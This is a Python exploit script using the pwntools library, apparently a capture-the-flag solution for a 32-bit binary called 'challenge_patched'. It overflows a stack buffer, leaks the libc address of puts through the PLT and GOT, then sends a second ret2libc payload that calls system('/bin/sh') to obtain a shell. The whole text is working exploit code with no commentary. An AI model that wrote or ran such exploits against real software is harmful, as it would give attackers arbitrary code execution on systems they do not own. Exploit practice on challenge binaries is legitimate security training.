#!/usr/bin/env python3

from pwn import *

exe = ELF("challenge_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux.so.2")

context.binary = exe

def main():
    r = process([exe.path])
    r.recvuntil("you?")
    
    r.sendline(b"A"* 64 + b"B" * 8 + p32(exe.plt["puts"])+ p32(exe.symbols["main"]) + p32(exe.got["puts"]))

    r.recvline()
    leak = u32(r.recv(4))
    
    log.success(f"puts libc @{leak:x}")
    libc.address = leak - libc.symbols["puts"]
    log.success(f"libc base @{libc.address:x}")
    
    bin_sh = next(libc.search(b"/bin/sh"))

    r.sendline(b"A"* 64 + b"B" * 8 + p32(libc.symbols["system"])+ p32(libc.symbols["exit"]) + p32(bin_sh))



if __name__ == "__main__":
    main()
